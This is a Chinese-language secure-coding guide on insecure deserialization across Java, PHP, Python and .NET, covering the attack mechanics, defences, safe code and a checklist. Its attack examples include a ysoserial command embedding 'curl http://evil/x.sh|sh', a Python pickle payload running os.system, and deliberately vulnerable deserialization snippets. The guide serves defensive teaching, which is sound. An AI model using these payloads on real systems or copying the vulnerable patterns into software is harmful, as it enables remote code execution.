# 不安全反序列化 (Insecure Deserialization)

> 分类：注入类 | 风险：严重 | CWE-502 | OWASP A08:2021

## 1. 攻击原理

应用把不可信数据反序列化为对象时，攻击者构造恶意序列化载荷，触发目标语言/库的 **gadget chain**，在反序列化过程中执行任意代码，或篡改对象属性绕过鉴权。

高风险场景：

- Java：`ObjectInputStream.readObject()`、`XStream`、`Fastjson`、`Jackson` 多态类型（`enableDefaultTyping`）、`Hessian`、`Kryo`
- PHP：`unserialize()`（`__wakeup` / `__destruct` 魔术方法）
- Python：`pickle.loads()`、`yaml.load()`（非 safe_load）、`marshal`
- .NET：`BinaryFormatter`、`LosFormatter`、`TypeNameHandling.All`
- Ruby：`Marshal.load`

## 2. 攻击示例

### Java

```java
// ❌ 直接反序列化不可信输入
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();
```

载荷可由 `ysoserial` 生成（CommonsCollections、Groovy、Spring 等 gadget）：

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://evil/x.sh|sh' | base64
```

### PHP

```php
// ❌
$data = unserialize($_COOKIE['prefs']);
```
利用 `__destruct` 中调用 `system()` 的类。

### Python

```python
# ❌
import pickle, yaml
obj = pickle.loads(request.data)          # RCE
cfg = yaml.load(request.data)             # RCE（旧 API）
```

```python
# 载荷
import os, pickle
class P:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(P())
```

### .NET

```csharp
// ❌
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);
```

## 3. 影响

- 远程代码执行（最常见后果）
- 权限提升、认证绕过（篡改序列化对象中的 `role`）
- 数据篡改、拒绝服务

## 4. 防御措施

1. **不反序列化不可信数据**（最有效）：用 JSON / Protobuf 等纯数据格式，配合 schema 校验。
2. **禁用危险 API**：Java 禁用 `ObjectInputStream` 处理外部输入；.NET 禁用 `BinaryFormatter`（.NET 5+ 已弃用）；Python 禁用 `pickle` 处理外部数据，用 `yaml.safe_load`。
3. **类型白名单**：Jackson 禁用 `enableDefaultTyping`，使用 `@JsonTypeInfo` 显式白名单；Fastjson 升级到 2.x 并开启 safeMode。
4. **签名与加密**：必须传输序列化对象时，使用 HMAC 签名 + 加密，验证通过后才反序列化（注意密钥管理）。
5. **网络与进程隔离**：反序列化在独立低权限进程/容器中执行，无出网、只读 FS。
6. **依赖治理**：移除不必要的 gadget 库（CommonsCollections 等），SCA 扫描已知链。
7. **监控**：对反序列化入口做异常长度、魔法字节检测与告警。

## 5. 代码对比

```java
// ✅ 用 JSON + 显式 DTO
ObjectMapper mapper = new ObjectMapper();
mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ...); // ❌ 不要
UserDto dto = mapper.readValue(json, UserDto.class); // ✅

// ✅ 必须用 Java 序列化时使用白名单过滤器（JDK 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.dto.*;!*");
ois.setObjectInputFilter(filter);
```

```python
# ✅
import json
data = json.loads(request.data)
# ✅ YAML
import yaml
cfg = yaml.safe_load(stream)
```

```php
# ✅
$data = json_decode($_POST['data'], true, 512, JSON_THROW_ON_ERROR);
// 必须 unserialize 时：json 替代 + 签名校验 + allowed_classes
$obj = unserialize($signed, ['allowed_classes' => ['Prefs']]);
```

## 6. 自查清单

- [ ] 无 `readObject` / `unserialize` / `pickle.loads` / `BinaryFormatter` 处理外部输入
- [ ] Jackson 未开启 default typing；Fastjson 已升级且 safeMode 开启
- [ ] 使用 JSON/Protobuf + schema 校验
- [ ] 必须序列化时使用 HMAC 签名与类型白名单
- [ ] gadget 依赖已清理，SCA 无高危告警
- [ ] 反序列化入口有监控与异常告警

## 7. 参考资料

- OWASP: Deserialization Cheat Sheet
- CWE-502: Deserialization of Untrusted Data
- ysoserial / marshalsec 项目
- PortSwigger: Insecure deserialization
